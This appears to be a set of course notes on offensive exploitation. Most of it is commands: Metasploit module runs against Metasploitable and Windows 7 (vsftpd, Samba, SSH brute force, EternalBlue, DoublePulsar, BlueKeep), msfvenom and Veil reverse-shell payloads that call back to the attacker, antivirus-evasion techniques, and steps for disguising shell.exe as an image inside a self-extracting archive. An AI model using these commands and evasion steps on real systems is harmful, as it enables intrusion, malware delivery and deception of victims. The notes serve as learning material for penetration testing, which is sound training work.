# Exploitation

We exploit one of the vulnerabilities we discovered to send a payload to the target. This will allow us to execute commands on the target system and navigate files. 

The payload tells the target system to make a connection to the hacker's computer and allow it to execute commands.

Social engineering is used whenever there are no known vulnerabilities on a target. We would try to get the target to open our payload themselves through a spoofed email or USB drive.

## Vulnerabilities

Exploitable vulnerabilities are possible because ports must be open on computers in order to connect to the internet. The goal is to gain access to poorly written software through an open port on a computer.

However, a lot of companies are extremely secure, so the most vulnerable targets will be employees through social engineering attacks.

## Reverse and Bind Shells

Shells will usually be the payloads we drop on a target. There are two different types of shells we will use: reverse and bind.

Reverse shells will try to connect back to the hacker's computer through TCP connection.

Bind shells are used whenever the target has an open port, we connect to it with our computer and pass the payload. This are less common because of firewall security features.

## Metasploit Framework

Metasploit offers thousands of exploits (Ruby) for Windows, Mac, and Linux. It also offers payloads (singles - standalone payload like adding a user or running an application, stagers - set up connection between attacker and target, stages - components downloaded by stagers modules), auxiliary modules (scanning, fuzzing, and DoS), encoders (helps evade antivirus detection, but most antivirus software is familiar with this), evasion modules (similar to encoders), nops (stops programs from running to allocate memory for future programs), and post exploitation modules (gather info like files saved, passwords, dumping hashes, enumerating the services and applications, etc.) as well.

Navigate to the exploits folder of metasploit and `nano FILENAME` to see details of how the exploit works.

### Msfconsole

`msfconsole` - opens metasploitable console

`help` - shows available commands

`show MODULENAME` - list available commands within a specific module

`use MODULENAME/FILEPATH` - execute a module command
    `use exploit/windows/smb/ms06_040_netapi`
    `show info` - shows more information on command
    `show options` - options available for the command
    `set OPTION NEWVALUE` - update a specific option's value
    `show payloads` - shows list of payloads available for this specific exploit
    `show targets` - shows list of targets vulnerable to this specific exploit
    `exploit` - run exploit

### First Exploits 

### vsftp 2.3.4 Exploitation

`sudo nmap -sV METASPLOITABLE` - scan for open ports

`searchsploit vsftp 2.3.4` - search metasploit framework for known exploits

`search vsftp` - (in msfconsole)

`use EXPLOITPATH`

`show info` - learn more about this specific exploit

`show options` - see parameters we need to use

`set RHOSTS METASPLOITABLE` - update target ip

`show payloads` - see default payloads to be sent

`show targets`

`exploit` - run the exploit

`whoami` `pwd` `ifconfig` `exit`

### Bindshell Exploitation (Misconfiguration)

Sometimes misconfigurations happen. Metasploitable has it's root shell open on a port. This isn't an 'exploit', just a misconfiguration that allows us root access.

`nc -h` - menu for netcab. We can connect or listen for inbound connections to ports.

`nc METASPLOITABLE 1524` - gives us access to root account

### Telnet Exploitation (Information Disclosure)

Run when telnet port is open. Telnet requires username and password to login, sometimes these are set to default.

`telnet METASPLOITABLE` - pulls up metasploitable cli, which tells us the login information. Login doesn't give us root access, however

`sudo su` - gives access to root account

### Samba Exploitation (Software Vulnerability)

nmap scan shows samba is running on open port, but does not give us the specific version. Searchsploit returns a lot of results for known exploits for different Samba versions. We can use a metasploit module to help.

`use auxiliary/scanner/smb/smb_version`

`show info` - description shows this module displays system versions

`show options` - see required parameters

`set RHOSTS IPADDRESS`

`run` - returns the specific Samba version

`searchploit Samba 3.0.20` - look for executables

`search samba` - search metasploit to find searchploit reference

`use exploit/multi/samba/usermap_script`

`show info` `show options`

`run`

### Attacking SSH - Bruteforce

Send a lot of information to the target in order to figure out which information is correct. For instance, lots of username and password combinations.

`search ssh`

`use auxiliary/scanner/ssh/ssh_login`

`show options`

We will be creating a username file and password file to use.

`cd Desktop/` (new terminal)

`nano usernames.txt`

`nano passwords.txt`

We know msfadmin is username and password for the target machine, so we will add them to the files.

`set PASS_FILE FILE/PATH/TO/PASSWORDS` (metasploitable)

`set USER_FILE FILE/PATH/TO/USERNAMES`

`show options`

`set RHOSTS TARGETIP`

`set VERBOSE true`

`run`

This will output a list of successful and failed password attempts. When there's a successful attempt, metasploitable will save a shell session in the background.

`sessions` - see all running metasploitable shell sessions

`sessions -i ID` - enter specific shell instance

`whoami` - msfadmin

`sudo su` - msfadmin

`whomai` - root

`exit`

`ssh msfadmin@METASPLOITABLEIP`

### Eternal Blue - Windows 7

`search eternalblue`

A few options pop up, copy the file path and insert after `use` to test out. Set the options and `show info` to learn more about the Eternal Blue exploit.

## Double Pulsar - Windows 7

Exploits a vulnerability through Eternalblue, and doublepulsar is used to remotely inject a malicious dll

`sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32`

wine32 allows use to run Windows commands on Linux machine, which is needed for this exploit.

Download Windows installer from Python 2.7.14 page.

From root user - 

`wine msiexec /i python-2.7.14.msi`

This installs Python 2.7 as a windows program.

Download Eternal Blue Double Pulsar code from GitHub.

From inside doublepulsar folder, copy code into metasploitable and root - 

`cp deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/ -r`

`cp deps/ /root/ -r`

`cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ -r`

`cp eternalblue_doublepulsar.rb /root/ -r`

`use exploit/windows/smb/eternalblue_doublepulsar`

`show info`

`show options` - all parameters are required. Set PROCESSINJECT, RHOSTS, TARGETARCHITECTURE, and payload.

Copy entire eternalblue doublepulsar folder to root

### BlueKeep - Windows 7

A RDP vulnerability that gains access through port 3389 without having to authenticate.

`msfconsole`

`search bluekeep`

Two options pop up, try the auxiliary module first.

`show options` - Set RHOSTS, then run. It lets you know that the target is vulnerable.

Use the exploits folder code next - 

`use PATH/TO/EXPLOIT/CODE`

Set RHOSTS.

`show targets` - exploit only applies to 64 bit machines. Set target to 2.

`run` then `getuid`

## Routersploit

Compromising a router allows you access to the network and control over the network. A lot of router's use default passwords as well.

Download routersploit from GitHub, and install the python requirements.

It will open up a terminal similar to the metasploit framework.

`use scanner/autopwn`

`show options`

Running this will pull up list of possible exploits. Nmap will also show open ports on your router that you can google to exploit.

Set target to router IP

## CVE 2020-0796 - Windows 10 Exploit

Nessus contains a plugin with this exploit, but it is hit or miss. Search GitHub for code. This vulnerability allows you to remotely crash a Windows 10 machine just by knowing its IP address.

[ZecOps' Code](https://github.com/ZecOps/CVE-2020-0796-RCE-POC)

## Generating Payloads with Msfvenom

Msfvenom is a standalone payload generator made available through metasploit

`msfvenom -h` - show available commands

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI'SIP LPORT=LOCALPORT -f exe -o shell.exe` - saves a windows (64bit) payload from our Kali Linux machine through a specified port with a .exe file type named shell.exe. When this file is opened on a target machine, it will create a meterpreter shell and connect it to our open port.

We then set up a listener to listen on our local port.

Inside msfconsole - 

`use exploit/multi/handler`

Set payload, LHOST, and LPORT - windows/x64/meterpreter/reverse_tcp

### Other msfvenom usage

`msfvenom -h`

`msfvenom --list formats` - lists available payload file types we can use

VirusTotal - website that detects if your virus will be caught by available antivirus solutions. It saves uploaded files

`msfvenom --list payloads` - lists available payload types

`msfvenom --list encoders` - list available encorders that are used to bypass firewalls

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI'SIP LPORT=LOCALPORT -a x64 -e x64/zutto_dekiru -i 15 --platform windows -n 500 -f exe -o shell2.exe` - gets detected by 38/67 antivirus software

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI'SIP LPORT=LOCALPORT -x putty.exe -f exe -o shell3.exe` - Run in downloads folder after downloading PuTTY exe file. This generates a payload that uses another program as its template, so to try to fool antivirus programs. Detected by 29/69 programs.

Generating a similar payload as a python file is not detected by any antivirus solution, but Windows does not come with python installed, so how will we get it to run?

## Generating Payloads with Veil

`apt-get install veil`

`veil` - starts up program

Within veil - 

`list` - lists available payloads

`use 22` - uses powershell payload, then lists config options. Detection rate of 27/67. Many antivirus programs pick up on .bat -> .exe file conversion

set SLEEP (20 - program will wait 20 seconds to establish a connection with our computer), LHOST

`generate` - name 'powerpayload' and generates code into a .bat file. Download B2E file from GitHub to convert to .exe.

Copy the Metasploit resource path and run in metasploit to automatically begin listening - 

`resource FILEPATH`

## [TheFatRat](https://github.com/Screetsec/TheFatRat) Payload Generator

This is another payload generating tool.

## Bypassing Antivirus

There are no clear ways for bypassing. Methods get outdated all the time, but some things help avoid detection.

1. Creating your own payload is the best option because it will most likely be unique and therefore avoid antivirus databases.

2. Look out for new tools that generate payloads. TheFatRat and Veil were both undetectable whenever they first came out. But as more people start using these tools, they become more known to antivirus programs.

3. When using payload generators, change your payload as much as possible in between uses and add multiple config options. Hexeditor will also help in changing the binary, which changes the file hash that antiviruses detect.

4. If you have the payload source code, try changing it up by adding a random function inside the code that doesn't do anything. Once the new code is compiled, it will have a different binary compoared to the original.

## Hexeditor

This is a tool that changes the code binary in order to change the file hash that is often stored by antiviruses.

`hexeditor shell.exe` - the binary aligns with output to the right. Comments are something that is easy to change

`md5sum shell.exe` - displays file hash

## Payload as Image

Use .png to .ico file converter online.

Select image and shell.exe, 

right click -> 'add to archive' -> ZIP -> Create SFX archive,

advanced SFX -> Update tab -> extract and update files -> overwrite all files,

Text and icon tab -> Load SFX icon from file -> Browse -> select .ico file,

Modes tab -> Unpack to temporary folder -> Hide all,

Setup tab -> Run after extraction -> "car.png (.ico?) \n shell.exe"